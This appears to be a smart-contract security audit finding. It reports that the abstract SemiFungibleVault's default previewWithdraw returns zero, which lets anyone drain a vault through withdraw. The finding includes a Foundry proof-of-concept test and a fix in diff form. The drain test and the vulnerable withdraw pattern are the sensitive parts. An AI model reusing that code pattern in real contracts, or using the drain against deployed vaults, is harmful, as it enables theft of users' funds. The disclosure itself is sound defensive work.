# `SemiFungibleVault` can be drained

## Summary

The default implementation of `SemiFungibleVault`'s `withdraw` function allows anyone to drain all underlying tokens from the vault. 

## Vulnerability Detail

The `withdraw` function in `SemiFungibleVault` is defined as follows:

```solidity
function withdraw(
    uint256 id,
    uint256 assets,
    address receiver,
    address owner
) external virtual returns (uint256 shares) {
    require(
        msg.sender == owner || isApprovedForAll(owner, msg.sender),
        "Only owner can withdraw, or owner has approved receiver for all"
    );

    shares = previewWithdraw(id, assets);

    _burn(owner, id, shares);

    emit Withdraw(msg.sender, receiver, owner, id, assets, shares);
    asset.safeTransfer(receiver, assets);
}
```

When a user calls `withdraw`, they provide an amount via the `assets` parameter. The `previewWithdraw` function is called, with the intention of using `amount` to calculate the number of shares that will be burned. 

However, the default implementation of the `previewWithdraw` is a no-op that will always return `0`.

```solidity
    function previewWithdraw(
        uint256 id,
        uint256 assets
    ) public view virtual returns (uint256) {}
```

Therefore a user can call `withdraw` with any amount of `assets` and the `previewWithdraw` function will return `0`. This means that the `withdraw` function will burn `0` shares, and will transfer the full amount of `assets` to the `receiver` address.

## Impact

A user can call `withdraw` with the vaults full balance as `assets` and drain all underlying tokens from the vault.

While I realize these functions are overridden in `VaultV2`, the fact that `SemiFungibleVault` is an abstract contract implies that it is meant to be reusable as a base contract for other vaults. Auditing it as an abstract contract, it is a vulnerable one.

The default implementation of this function is extremely dangerous should it be used in a different context.

### Proof of concept
```solidity
contract Derived is SemiFungibleVault {
    constructor(
        IERC20 asset_
    ) SemiFungibleVault(asset_, "name", "symbol", "tokenURI") {}
}

contract VaultIssues is Helper {
    function testDrain() public {
        // create a vault with 100 tokens
        address asset = address(new MintableToken("name", "symbol"));
        Derived vault = new Derived(IERC20(asset));
        deal(asset, address(vault), 100 ether, true);

        // confirm initial balances
        assertEq(IERC20(asset).balanceOf(address(vault)), 100 ether);
        assertEq(IERC20(asset).balanceOf(USER), 0);

        // drain the vault
        vm.prank(USER);
        vault.withdraw(0, 100 ether, USER, USER);

        // confirm drained vault
        assertEq(IERC20(asset).balanceOf(address(vault)), 0);
        assertEq(IERC20(asset).balanceOf(USER), 100 ether);
    }
}
```

## Tool used

Manual Review

## Recommendation

The default implementation should be changed so the `assets` amount passed in gets burned. 

```diff
-   shares = previewWithdraw(id, assets);

-   _burn(owner, id, shares);
+   _burn(owner, id, assets);
```

Alternatively, the `withdraw` and `previewWithdraw` functions should be marked as `abstract` and have no default implementation. This would force derived contracts to implement these functions and remove the default vulnerability.
